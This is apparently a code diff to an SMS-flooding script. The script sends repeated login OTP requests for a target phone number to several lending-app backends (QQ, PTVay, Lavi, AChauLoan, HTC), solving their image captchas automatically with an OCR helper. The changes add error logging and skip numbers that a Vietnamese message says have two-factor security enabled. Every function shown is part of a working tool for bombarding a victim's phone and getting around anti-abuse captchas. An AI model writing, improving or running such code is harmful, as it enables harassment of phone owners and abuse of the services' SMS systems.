@@ -155,9 +155,11 @@ async def _qq_send(phone_otp: str, endpoint: str, label: str):
                 return
             cap_b64 = (d1.get("data") or {}).get("captcha", "")
             if not cap_b64:
+                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
+                print(f" ✘ {label} OCR fail")
                 return
             r2 = await c.post(
                 f"{_QQ_BASE}{endpoint}",
@@ -165,11 +167,12 @@ async def _qq_send(phone_otp: str, endpoint: str, label: str):
                 json=_qq_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
             )
             d2 = r2.json()
-            ok = str(d2.get("code", "")) == "0"
-            if ok:
+            if str(d2.get("code", "")) == "0":
                 print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            else:
+                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
     except Exception as e:
-        pass
+        print(f" ✘ {label} exception: {e}")
 
 async def qq_sms(phone_otp: str):
     await _qq_send(phone_otp, "/base/xmh/getSMSCode", "QQ SMS")
@@ -219,9 +222,11 @@ async def _ptv_send(phone_otp: str, endpoint: str, cap_key: str, label: str):
                 return
             cap_b64 = (d1.get("data") or {}).get(cap_key, "")
             if not cap_b64:
+                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
+                print(f" ✘ {label} OCR fail")
                 return
             r2 = await c.post(
                 f"{_PTV_BASE}{endpoint}",
@@ -229,11 +234,12 @@ async def _ptv_send(phone_otp: str, endpoint: str, cap_key: str, label: str):
                 json=_ptv_body(phone_otp, {"figureVeri": answer}),
             )
             d2 = r2.json()
-            ok = str(d2.get("code", "")) == "0"
-            if ok:
+            if str(d2.get("code", "")) == "0":
                 print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            else:
+                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
     except Exception as e:
-        pass
+        print(f" ✘ {label} exception: {e}")
 
 async def ptvay_sms(phone_otp: str):
     await _ptv_send(phone_otp, "/lvjKRH/brRsY/JHkuyNids/RlhiPz", "jmJiSn2D1", "PTVay SMS")
@@ -281,9 +287,11 @@ async def _lavi_send(phone_otp: str, endpoint: str, label: str):
                 return
             cap_b64 = (d1.get("data") or {}).get("captcha", "")
             if not cap_b64:
+                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
+                print(f" ✘ {label} OCR fail")
                 return
             r2 = await c.post(
                 f"{_LAVI_BASE}{endpoint}",
@@ -291,11 +299,12 @@ async def _lavi_send(phone_otp: str, endpoint: str, label: str):
                 json=_lavi_body(phone_otp, {"figureVeri": answer}),
             )
             d2 = r2.json()
-            ok = str(d2.get("code", "")) == "0"
-            if ok:
+            if str(d2.get("code", "")) == "0":
                 print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            else:
+                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
     except Exception as e:
-        pass
+        print(f" ✘ {label} exception: {e}")
 
 async def lavi_sms(phone_otp: str):
     await _lavi_send(phone_otp, "/base/xmh/getSMSCode", "Lavi SMS")
@@ -343,14 +352,20 @@ async def _achau_send(phone_otp: str, endpoint: str, label: str):
                 json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": False}),
             )
             d1 = r1.json()
-            if str(d1.get("code", "")) == "0":
+            code1 = str(d1.get("code", ""))
+            if code1 == "0":
                 print(f" ✅ {label} {phone_otp}  {d1.get('message','')}")
+                return
+            if code1 == "106":
+                print(f" ⚠️  {label} code 106 — số đã kích hoạt bảo mật 2 lớp, bỏ qua")
                 return
             cap_b64 = (d1.get("data") or {}).get("captcha", "")
             if not cap_b64:
+                print(f" ✘ {label} step1 code={code1} msg={d1.get('message','')!r}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
+                print(f" ✘ {label} OCR fail")
                 return
             r2 = await c.post(
                 f"{_ACHAU_BASE}{endpoint}",
@@ -358,11 +373,15 @@ async def _achau_send(phone_otp: str, endpoint: str, label: str):
                 json=_achau_body(phone_otp, {"veriType": "LOGIN", "figureVeri": answer}),
             )
             d2 = r2.json()
-            ok = str(d2.get("code", "")) == "0"
-            if ok:
+            code2 = str(d2.get("code", ""))
+            if code2 == "0":
                 print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            elif code2 == "106":
+                print(f" ⚠️  {label} code 106 sau captcha — số đã bật bảo mật 2 lớp")
+            else:
+                print(f" ✘ {label} step2 [{answer}] code={code2} msg={d2.get('message','')!r}")
     except Exception as e:
-        pass
+        print(f" ✘ {label} exception: {e}")
 
 async def achau_sms(phone_otp: str):
     await _achau_send(phone_otp, "/AQadQ/Jfmb/goMXd/IuGP", "AChauLoan SMS")
@@ -416,9 +435,11 @@ async def _htc_send(phone_otp: str, endpoint: str, label: str):
                 return
             cap_b64 = (d1.get("data") or {}).get("captcha", "")
             if not cap_b64:
+                print(f" ✘ {label} step1 code={d1.get('code')} msg={d1.get('message','')!r}")
                 return
             answer = _qq_solve(cap_b64)
             if not answer:
+                print(f" ✘ {label} OCR fail")
                 return
             r2 = await c.post(
                 f"{_HTC_BASE}{endpoint}",
@@ -426,11 +447,12 @@ async def _htc_send(phone_otp: str, endpoint: str, label: str):
                 json=_htc_body(phone_otp, {"phoneNo": phone_otp, "veriType": "LOGIN", "figureVeri": answer}),
             )
             d2 = r2.json()
-            ok = str(d2.get("code", "")) == "0"
-            if ok:
+            if str(d2.get("code", "")) == "0":
                 print(f" ✅ {label} {phone_otp}  [{answer}]  {d2.get('message','')}")
+            else:
+                print(f" ✘ {label} step2 [{answer}] code={d2.get('code')} msg={d2.get('message','')!r}")
     except Exception as e:
-        pass
+        print(f" ✘ {label} exception: {e}")
 
 async def htc_sms(phone_otp: str):
     await _htc_send(phone_otp, "/base/xmh/getSMSCode", "HTC SMS")
